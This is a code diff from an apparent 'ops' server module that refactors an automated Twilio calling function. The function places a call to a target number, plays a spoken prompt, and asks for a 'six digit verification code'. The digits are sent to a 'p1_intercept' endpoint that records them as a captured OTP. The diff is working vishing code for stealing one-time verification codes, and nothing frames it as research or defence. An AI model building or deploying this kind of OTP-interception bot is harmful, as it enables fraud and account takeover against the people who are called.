@@ -80,41 +80,45 @@ class handler(BaseHTTPRequestHandler):
             if not all([sid, token, from_num]):
                 return self._json(400, {"error": "Twilio Credentials Missing"})
 
-            try:
-                # Direct Twilio REST API Call
-                auth = aiohttp.BasicAuth(sid, token)
-                url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json"
-                
-                # TwiML payload for automated P1 interception
-                twiml_content = f"""<Response>
-                    <Play loop="1">https://reaper.tech/assets/ambience/{ambience}.mp3</Play>
-                    <Say voice="{data.get('voice', 'alice')}">{prompt}</Say>
-                    <Gather numDigits="6" action="https://{self.headers.get('Host')}/api/ops?module=sip&amp;action=p1_intercept&amp;target={target}" method="POST">
-                        <Say voice="{data.get('voice', 'alice')}">Please enter your six digit verification code now.</Say>
-                    </Gather>
-                </Response>"""
+            async def trigger_twilio():
+                try:
+                    # Direct Twilio REST API Call
+                    auth = aiohttp.BasicAuth(sid, token)
+                    url = f"https://api.twilio.com/2010-04-01/Accounts/{sid}/Calls.json"
+                    
+                    # TwiML payload for automated P1 interception
+                    twiml_content = f"""<Response>
+                        <Play loop="1">https://reaper.tech/assets/ambience/{ambience}.mp3</Play>
+                        <Say voice="{data.get('voice', 'alice')}">{prompt}</Say>
+                        <Gather numDigits="6" action="https://{self.headers.get('Host')}/api/ops?module=sip&amp;action=p1_intercept&amp;target={target}" method="POST">
+                            <Say voice="{data.get('voice', 'alice')}">Please enter your six digit verification code now.</Say>
+                        </Gather>
+                    </Response>"""
 
-                data_payload = {
-                    "To": target,
-                    "From": from_num,
-                    "Twiml": twiml_content
-                }
+                    data_payload = {
+                        "To": target,
+                        "From": from_num,
+                        "Twiml": twiml_content
+                    }
 
-                # We'll use aiohttp to signal Twilio
-                async with aiohttp.ClientSession(auth=auth) as session:
-                    async with session.post(url, data=data_payload) as resp:
-                        res_data = await resp.json()
-                        if resp.status == 201:
-                            self._json(200, {
-                                "status": "dialing",
-                                "sid": res_data.get('sid'),
-                                "target": target,
-                                "provider": "Twilio"
-                            })
-                        else:
-                            self._json(resp.status, {"error": res_data.get('message')})
-            except Exception as e:
-                self._json(500, {"error": str(e)})
+                    # We'll use aiohttp to signal Twilio
+                    async with aiohttp.ClientSession(auth=auth) as session:
+                        async with session.post(url, data=data_payload) as resp:
+                            res_data = await resp.json()
+                            return resp.status, res_data
+                except Exception as e:
+                    return 500, {"error": str(e)}
+
+            status, res_data = asyncio.run(trigger_twilio())
+            if status == 201:
+                self._json(200, {
+                    "status": "dialing",
+                    "sid": res_data.get('sid'),
+                    "target": target,
+                    "provider": "Twilio"
+                })
+            else:
+                self._json(status, {"error": res_data.get('message') if status != 500 else res_data.get('error')})
         elif action == 'p1_intercept':
             # Callback endpoint for the Asterisk AGI/ARI to report captured DTMF digits
             otp = data.get('otp', '')
